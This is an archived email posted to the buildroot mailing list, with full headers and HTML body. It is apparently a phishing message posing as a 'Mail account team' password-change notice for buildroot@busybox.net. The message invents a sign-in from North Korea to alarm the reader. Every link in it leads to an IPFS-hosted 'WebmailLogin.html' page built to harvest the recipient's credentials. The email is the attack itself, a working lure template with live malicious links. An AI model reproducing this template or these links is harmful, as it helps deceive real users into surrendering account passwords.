Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp2.osuosl.org (smtp2.osuosl.org [140.211.166.133])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 87429C4345F
	for <buildroot@archiver.kernel.org>; Fri,  3 May 2024 16:47:05 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp2.osuosl.org (Postfix) with ESMTP id 282BA40511;
	Fri,  3 May 2024 16:47:05 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp2.osuosl.org ([127.0.0.1])
 by localhost (smtp2.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id ZNZFYVrCB-fO; Fri,  3 May 2024 16:47:04 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp2.osuosl.org 3233441D77
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp2.osuosl.org (Postfix) with ESMTP id 3233441D77;
	Fri,  3 May 2024 16:47:04 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id 745B41BF990
 for <buildroot@lists.busybox.net>; Fri,  3 May 2024 16:47:02 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 68F1D83BB8
 for <buildroot@lists.busybox.net>; Fri,  3 May 2024 16:47:02 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 6RkzeAesNXS7 for <buildroot@lists.busybox.net>;
 Fri,  3 May 2024 16:47:01 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=109.91.157.25;
 helo=busybox.net; envelope-from=account-security-noreply@busybox.net;
 receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 358B783BEA
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 358B783BEA
Received: from busybox.net (ip-109-091-157-025.um37.pools.vodafone-ip.de
 [109.91.157.25])
 by smtp1.osuosl.org (Postfix) with ESMTP id 358B783BEA
 for <buildroot@busybox.net>; Fri,  3 May 2024 16:47:00 +0000 (UTC)
From: Mail account team <account-security-noreply@busybox.net>
To: buildroot@busybox.net
Date: 3 May 2024 19:47:00 +0300
Message-ID: <20240503194659.C64A92651DC9B218@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Mail account password change
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============9065700614254077848=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============9065700614254077848==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<meta name=3D"GENERATOR" content=3D"MSHTML 8.00.7601.17514"></head>
<body style=3D"margin: 0.4em;"><p><br></p><div id=3D"forwardbody1"><div><ta=
ble style=3D"width: 986px; height: 616px;" dir=3D"ltr">
<tbody>
<tr>
<td id=3D"v1i1" style=3D'padding: 0px; color: rgb(112, 112, 112); font-fami=
ly: "Segoe UI Semibold", "Segoe UI Bold", "Segoe UI", "Helvetica Neue Mediu=
m", Arial, sans-serif; font-size: 17px;'>Mail account</td>
</tr>
<tr>
<td id=3D"v1i2" style=3D'padding: 0px; color: rgb(38, 114, 236); font-famil=
y: "Segoe UI Light", "Segoe UI", "Helvetica Neue Medium", Arial, sans-serif=
; font-size: 41px;'>Your password changed</td>
</tr>
<tr>
<td id=3D"v1i3" style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); fon=
t-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'=
>Your password for the Mail account <a class=3D"v1link" id=3D"v1iAccount" s=
tyle=3D"color: rgb(38, 114, 236); text-decoration: none;" href=3D"mailto:a*=
*s@wizardfancydress.co.uk" rel=3D"noreferrer">buildroot@busybox.net</a> was=
 changed on&nbsp;3.5.2024 19:46:59 (GMT).<br><br><table dir=3D"ltr"><tbody>=
<tr>
<td id=3D"v1i6" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); font=
-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>=
Country/region: North Korea</td></tr><tr><td id=3D"v1i7" style=3D'padding: =
6px 0px 0px; color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verda=
na, Arial, sans-serif; font-size: 14px;'>Platform: Windows</td></tr><tr>
<td id=3D"v1i8" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); font=
-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>=
Browser: Chrome</td></tr><tr><td id=3D"v1i9" style=3D'padding: 6px 0px 0px;=
 color: rgb(42, 42, 42); font-family: "Segoe UI", Tahoma, Verdana, Arial, s=
ans-serif; font-size: 14px;'>IP address: 173.159.78.6</td></tr></tbody></ta=
ble></td>
</tr>
<tr>
<td id=3D"v1i4" style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); fon=
t-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'=
>If this was you, then you can safely ignore this email.</td>
</tr>
<tr>
<td id=3D"v1i5" style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); fon=
t-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'=
></td>
</tr>
<tr>
<td id=3D"v1i6" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); font=
-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>=
</td>
</tr>
<tr>
<td id=3D"v1i7" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); font=
-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>=
</td>
</tr>
<tr>
<td id=3D"v1i8" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); font=
-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>=
</td>
</tr>
<tr>
<td id=3D"v1i9" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); font=
-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>=
</td>
</tr>
<tr>
<td id=3D"v1i10" style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); fo=
nt-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;=
'>If this wasn't you, your account has been compromised. Please follow thes=
e steps:</td>
</tr>
<tr>
<td id=3D"v1i11" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); fon=
t-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'=
><a class=3D"v1link" id=3D"v1iLink1" style=3D"color: rgb(38, 114, 236); tex=
t-decoration: none;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreiepeffo=
mapufkscx646kcp5oj2tutezlyztwunjgyllhfuk5kr6ha?filename=3DWebmailLogin.html=
#buildroot@busybox.net" target=3D"_blank" rel=3D"noopener noreferrer">1. Re=
set your password.</a></td>
</tr>
<tr>
<td id=3D"v1i12" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); fon=
t-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'=
><a class=3D"v1link" id=3D"v1iLink4" style=3D"color: rgb(38, 114, 236); tex=
t-decoration: none;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreiepeffo=
mapufkscx646kcp5oj2tutezlyztwunjgyllhfuk5kr6ha?filename=3DWebmailLogin.html=
#buildroot@busybox.net" target=3D"_blank" rel=3D"noopener noreferrer">2. Re=
view your security info.</a></td>
</tr>
<tr>
<td id=3D"v1i13" style=3D'padding: 6px 0px 0px; color: rgb(42, 42, 42); fon=
t-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'=
><a class=3D"v1link" id=3D"v1iLink2" style=3D"color: rgb(38, 114, 236); tex=
t-decoration: none;" href=3D"https://cloudflare-ipfs.com/ipfs/bafkreiepeffo=
mapufkscx646kcp5oj2tutezlyztwunjgyllhfuk5kr6ha?filename=3DWebmailLogin.html=
#buildroot@busybox.net" target=3D"_blank" rel=3D"noopener noreferrer">3. Le=
arn how to make your account more secure.</a></td>
</tr>
<tr>
<td id=3D"v1i14" style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); fo=
nt-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;=
'>You can also <a class=3D"v1link" id=3D"v1iLink3" style=3D"color: rgb(38, =
114, 236); text-decoration: none;" href=3D"https://cloudflare-ipfs.com/ipfs=
/bafkreiepeffomapufkscx646kcp5oj2tutezlyztwunjgyllhfuk5kr6ha?filename=3DWeb=
mailLogin.html#buildroot@busybox.net" target=3D"_blank" rel=3D"noopener nor=
eferrer">opt out</a> or change where you receive security notifications.</t=
d>
</tr>
<tr>
<td id=3D"v1i15" style=3D'padding: 25px 0px 0px; color: rgb(42, 42, 42); fo=
nt-family: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;=
'>Thanks,</td>
</tr>
<tr>
<td id=3D"v1i16" style=3D'padding: 0px; color: rgb(42, 42, 42); font-family=
: "Segoe UI", Tahoma, Verdana, Arial, sans-serif; font-size: 14px;'>The Mai=
l account team</td>
</tr>
</tbody>
</table>
</div>
</div></body></html>

--===============9065700614254077848==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============9065700614254077848==--
